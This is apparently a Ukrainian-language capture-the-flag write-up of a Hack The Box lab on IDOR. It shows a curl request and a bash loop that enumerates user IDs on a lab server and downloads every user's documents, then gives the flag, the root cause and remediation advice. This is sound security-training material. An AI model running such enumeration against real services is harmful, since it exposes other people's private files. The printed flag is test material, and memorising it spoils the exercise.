# Web Attacks — IDOR (Insecure Direct Object Reference): Mass Enumeration

Модуль: [Web Attacks](https://academy.hackthebox.com/app/module/134)
Секція: [IDOR](https://academy.hackthebox.com/app/module/134/section/1186)
Ціль: 154.57.164.70:31879
Відповідь: `HTB{4ll_f1l35_4r3_m1n3}`

## Концепція

`documents.php` приймає параметр `uid` і повертає посилання на документи конкретного користувача, без перевірки, чи запитувач авторизований бачити саме ці документи (Broken Access Control / IDOR). Оскільки `uid` — це просте послідовне ціле число, а не непередбачуваний UUID/hash, ми можемо просто перебрати значення (1, 2, 3...) і отримати документи всіх користувачів, включно з тими, що не призначені нам.

Ключова відмінність від класичного IDOR (де експлуатують один конкретний `uid`) — тут потрібна **масова енумерація**: пройтись по діапазону uid, витягнути посилання з HTML-відповіді, і серед файлів знайти `.txt` (нетипове розширення серед `.pdf` — саме там і лежить флаг).

## Крок 1 — Базовий запит, аналіз структури відповіді

```bash
curl -s -X POST "http://154.57.164.70:31879/documents.php" -d "uid=1"
```

Бачимо, що для `uid=1` повертається HTML зі списком `<a href='/documents/....pdf'>`. Це підтверджує IDOR: параметр `uid` контролює, чиї файли показати, і сервер не перевіряє права доступу.

## Крок 2 — Автоматизація перебору uid 1–20

```bash
url="http://154.57.164.70:31879"

for i in {1..20}; do
  echo "== Checking uid $i =="
  for link in $(curl -s -X POST -d "uid=$i" "$url/documents.php" | grep -oP "/documents/[^'\"]*\.(pdf|txt)"); do
    filename=$(basename "$link")
    wget -q "$url$link" -O "$filename"
    if [[ "$filename" == *.txt ]]; then
      echo "FLAG FOUND in uid=$i: $filename"
    fi
  done
done
```

Пояснення логіки:
- Зовнішній цикл `for i in {1..20}` перебирає перші 20 uid, як зазначено в умові завдання.
- `curl -X POST -d "uid=$i"` — надсилає запит з поточним uid і отримує HTML-відповідь.
- `grep -oP "/documents/[^'\"]*\.(pdf|txt)"` — витягує всі шляхи до документів (pdf і txt) з HTML через regex, ігноруючи решту розмітки.
- `wget -q ... -O "$filename"` — одразу завантажує кожен знайдений файл локально для доказової бази (evidence).
- Умова `[[ "$filename" == *.txt ]]` — виявляє аномалію: серед типових `.pdf` документів (Invoice, Report) шукаємо нетипове розширення `.txt`, яке в цьому завданні є маркером флага.

Результат: на `uid=15` знайдено `flag_11dfa168ac8eb2958e38425728623c98.txt`.

## Крок 3 — Читаємо флаг

```bash
cat flag_11dfa168ac8eb2958e38425728623c98.txt
```

Результат:
```
HTB{4ll_f1l35_4r3_m1n3}
```

## Чому це працює (root cause для звіту)

- **Опис:** Ендпоінт `/documents.php` не перевіряє, чи користувач, що робить запит, авторизований отримувати документи, пов'язані з переданим `uid`.
- **Технічні деталі:** Параметр `uid` — послідовний числовий ідентифікатор без будь-якої перевірки сесії/токена/прав доступу на сервері; будь-яке значення `uid` повертає файли відповідного користувача.
- **Ризик/Імпакт:** Insecure Direct Object Reference (OWASP A01: Broken Access Control) — будь-який неавторизований відвідувач може масово перебрати всі uid і отримати доступ до конфіденційних документів усіх співробітників, включно з файлами, що не призначені для публічного доступу (в даному випадку — файл з чутливими даними/флагом).
- **Рекомендації:** Прив'язати вибірку документів до ID авторизованої сесії, а не до параметра, контрольованого клієнтом; впровадити перевірку прав доступу (ACL) на рівні сервера для кожного запиту; замінити послідовні числові ID на непередбачувані UUID як додатковий рівень захисту (defense in depth, не заміна авторизації).
